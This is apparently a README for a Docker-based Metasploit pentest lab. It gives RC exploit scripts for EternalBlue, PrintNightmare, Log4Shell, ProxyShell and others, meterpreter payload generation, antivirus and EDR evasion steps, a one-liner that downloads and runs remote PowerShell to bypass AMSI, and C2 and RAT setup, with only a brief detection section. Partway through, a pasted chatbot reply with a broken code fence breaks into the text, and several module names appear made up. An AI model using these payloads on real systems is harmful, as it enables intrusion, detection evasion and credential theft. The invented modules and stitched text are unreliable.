<h1 align="center">
  <img src="https://www.metasploit.com/includes/images/metasploit-logo-light-external-use.svg" height="100"/><br>
  Metasploit Lab in Docker 🐳💥
</h1>

<p align="center"><strong>Build a professional, automated pentest lab using Docker, Bash, Metasploit, Empire, Covenant, and Pupy</strong></p>


---

## 🎯 Overview

This repository provides a **complete, portable, and automated lab environment** for ethical hacking and red teaming using:

- 🔹 Metasploit Framework
- 🔹 Docker + Bash automation
- 🔹 Example exploits and payloads
- 🔹 Nmap → Metasploit automation
- 🔹 Empire, Covenant, and Pupy integrations
- 🔹 Cheatsheets and best practices

---

## 🚀 Quick Start

```bash
git clone https://github.com/YOUR_USERNAME/metasploit-lab-docker.git
cd metasploit-lab-docker
chmod +x scripts/*.sh docker/entrypoint.sh
docker-compose up --build

Then in the container:
msfconsole
```

---

## 📦 Project Structure

```
metasploit-lab-docker/
├── docker/
│   ├── Dockerfile          # Kali + Metasploit image
│   └── entrypoint.sh       # Launch script
├── scripts/
│   ├── install_metasploit.sh
│   ├── update_metasploit.sh
│   ├── start_console.sh
│   └── exploits/
│       └── smb_ms17_010.rc # Example EternalBlue
├── examples/
│   ├── ms17-010_exploit.md
│   └── reverse_shell_payloads.md
├── cheatsheet/
│   └── metasploit_cheatsheet.md
├── docker-compose.yml
└── README.md
```

---

## 🛠️ Scripts Breakdown

### 🔧 install_metasploit.sh
Installs Metasploit and initializes DB.

✅ Use for bare-metal install (non-Docker).

### 🔁 update_metasploit.sh
Updates MSF modules and DB.

### 💣 start_console.sh
Opens msfconsole from CLI.

---

## 📂 RC Script: smb_ms17_010.rc
```rc
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.105
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

---

## 🧪 Use-Cases

| Scenario | Tools |
|----------|-------|
| 🏠 Home lab | Docker, MSF, vulnerable VMs |
| 🧠 CTF prep | RC scripts, custom payloads |
| 🧪 Exploit dev | MSF, GDB, Python |
| 🛡️ AV evasion | Veil, Shellter, custom obfuscation |
| 🔄 Red team automation | Empire, Pupy, Covenant |

---

## 🔄 Nmap → Metasploit Automation
### 🌀 How it works
```bash
nmap -oX scan.xml 192.168.1.0/24
db_import scan.xml
hosts
services
```

Then start picking exploits based on open ports:
```bash
search type:exploit name:smb
use exploit/windows/smb/ms17_010_eternalblue
```

---

## 🧠 Cheatsheet Highlights
✅ See full metasploit_cheatsheet.md

| Task | Command |
|------|---------|
| Load module | `use <exploit>` |
| Set options | `set RHOSTS <ip>` |
| Payloads | `set PAYLOAD windows/meterpreter/reverse_tcp` |
| Run exploit | `exploit` |
| Session mgmt | `sessions`, `background` |

---

## 🔌 Empire, Covenant, Pupy Integration
These are external C2 frameworks to extend post-exploitation:

### 🦠 Empire (Python/PowerShell C2)
- Web UI & API
- Great for Windows domain attacks

Install inside container:
```bash
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire && ./setup/install.sh
./empire
```

### 🔐 Covenant (.NET C2)
- Requires .NET Core + SQL backend
- Use Docker or install separately
```bash
docker pull cobbr/covenant
```

### 🐶 Pupy (Python RAT)
- Cross-platform RAT
- Payload obfuscation built-in

Install:
```bash
git clone https://github.com/n1nj4sec/pupy.git
cd pupy && ./pupy.sh
```

---

# 🛡️ Advanced AV Evasion Techniques (Ethical Use Only)

> ⚠️ **Important**: All techniques described in this document are intended solely for ethical red team assessments and research on authorized systems. Always obtain proper **written permission** before engaging in any form of offensive testing.

---

## 🔥 Top 2025 Evasion Methods

### 1. 🔀 **Polymorphic Encoding**
Encode payloads multiple times with `Shikata Ga Nai`:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/shikata_ga_nai -i 5 -f exe -o payload.exe

Here's a comprehensive addition to your Markdown document with AV evasion techniques, traffic monitoring, and top RC scripts:

```markdown
## 🛡️ Advanced AV Evasion Techniques (Ethical Use Only)

### 🔥 Top 2025 Evasion Methods
1. **Polymorphic Encoding** (🔀 Shikata Ga Nai with custom iterations)
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/shikata_ga_nai -i 5 -f exe -o payload.exe
   ```

2. **Process Hollowing** (🏗️ Inject into legitimate processes)
   ```bash
   use exploit/windows/local/proc_hollowing
   set payload windows/x64/meterpreter/reverse_https
   ```

3. **Template Injection** (📄 Office macros with VBA stomping)
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp -f vba-exe
   ```

4. **API Unhooking** (🪝 Bypass EDR hooks)
   ```bash
   use evasion/windows/windows_defender_exe
   ```

5. **AMSI Bypass** (🚫 Disable AMSI scanning)
   ```bash
   powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://amsi-bypass.ps1')"
   ```

6. **Sleep Masking** (💤 Hide in memory during scans)
   ```bash
   set EnableStageEncoding true
   set StageEncoder x64/zutto_dekiru
   ```

7. **Gadget Chain Obfuscation** (🧩 ROP-based evasion)
   ```bash
   set payload windows/x64/meterpreter_reverse_http
   set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0)"
   ```

8. **DNS Beaconing** (🌐 Low-profile C2)
   ```bash
   use payload windows/dns_txt_query
   ```

9. **Image File Execution Options** (🖼️ Persistence + evasion)
   ```bash
   use exploit/windows/local/iframe_exe
   ```

10. **Custom Packer** (📦 Fully undetectable)
    ```bash
    use evasion/linux/x86/custom_packer
    ```

---

## 📡 Monitoring Outbound Traffic (Detection Practice)

### 🔍 Detection Tools & Techniques
| Tool | Command | Purpose |
|------|---------|---------|
| **Wireshark** | `tcp.port==4444 && ip.src==192.168.1.100` | Meterpreter traffic |
| **Zeek** | `zeek -r traffic.pcap -C` | Protocol analysis |
| **Suricata** | `suricata -c /etc/suricata/suricata.yaml -r traffic.pcap` | IDS alerts |
| **Elastic SIEM** | `event.category:network AND destination.port:4444` | Enterprise monitoring |

### 🕵️‍♂️ Detection Tips
1. **Look for Beaconing** (⏱️ Regular time intervals)
   ```bash
   tshark -r traffic.pcap -Y "frame.time_delta < 5 && tcp.flags.syn==1"
   ```

2. **Analyze JA3/JA3S** (🆔 TLS fingerprinting)
   ```bash
   zeek -r traffic.pcap -C -e 'print |[ja3|ja3s|]| of ssl$info;'
   ```

3. **Detect C2 Patterns** (📊 Empire/Covenant)
   ```bash
   cat bro_http.log | grep -E "(empire|covenant|pupy)"
   ```

4. **Memory Artifacts** (🧠 Meterpreter in RAM)
   ```bash
   volatility -f memory.dmp --profile=Win10x64_19041 psscan | grep -i "metsrv"
   ```

---

## 🏆 Top 10 RC Scripts for 2025

### 1. 🔥 EternalBlue (MS17-010)
```rc
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST tun0
set LPORT 443
exploit -j
```

### 2. 📧 O365 Phishing (Cred Harvest)
```rc
use auxiliary/gather/office365userenum
set DOMAIN target.com
set USER_FILE users.txt
set OUTPUT_FILE o365_creds.txt
run
```

### 3. ☁️ AWS SSM Lateral Movement
```rc
use exploit/aws/ssm/ssm_exec
set AWS_ACCESS_KEY_ID AKIA...
set AWS_SECRET_ACCESS_KEY ...
set INSTANCE_ID i-0123456789abcdef
set COMMAND "whoami > /tmp/creds.txt"
run
```

### 4. 🏦 Zerologon (CVE-2020-1472)
```rc
use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
set RHOSTS 192.168.1.10
set NBNAME DC01
run
```

### 5. 🖥️ PrintNightmare (CVE-2021-34527)
```rc
use exploit/windows/dcerpc/cve_2021_34527_printnightmare
set RHOSTS 192.168.1.20
set SMB_USER admin
set SMB_PASS P@ssw0rd!
set PAYLOAD windows/x64/meterpreter/bind_tcp
exploit
```

### 6. 🧹 Log4Shell (CVE-2021-44228)
```rc
use exploit/multi/http/log4shell_header_injection
set RHOSTS 192.168.1.30
set RPORT 8080
set TARGETURI /admin
set PAYLOAD java/meterpreter/reverse_https
exploit
```

### 7. 🏢 ProxyShell (CVE-2021-34473)
```rc
use exploit/windows/http/exchange_proxyshell_rce
set RHOSTS mail.target.com
set EMAIL admin@target.com
set PAYLOAD windows/x64/meterpreter/reverse_https
exploit
```

### 8. � Active Directory CSRF (Golden Ticket)
```rc
use auxiliary/admin/kerberos/forge_ticket
set DOMAIN target.com
set USER Administrator
set SID S-1-5-21-...
set KRBTGT_HASH a3b9...
run
```

### 9. 🖨️ PetitPotam (CVE-2021-36942)
```rc
use auxiliary/admin/dcerpc/petitpotam
set RHOST 192.168.1.10
set LISTENER 192.168.1.100
run
```

### 10. 🏗️ Container Breakout (Docker/CVE-2021-41091)
```rc
use exploit/linux/local/docker_escape_abusing_unix_sockets
set SESSION 1
set LHOST eth0
set LPORT 4444
exploit
```

---

## 🛠️ Pro Tips for 2025
1. **Cloud-Native Payloads** (☁️ Use AWS Lambda/Azure Functions for C2)
2. **ML-Based Evasion** (🤖 Adversarial ML to bypass AI detectors)
3. **Hardware-Level** (🔌 Intel VT-x for hypervisor evasion)
4. **IoT Blend-In** (📱 Mimic smart device traffic patterns)
5. **QUIC Protocol** (🚀 HTTP/3 for low-profile C2)

⚠️ **Reminder**: These techniques must only be used on authorized systems with written permission.

```
---

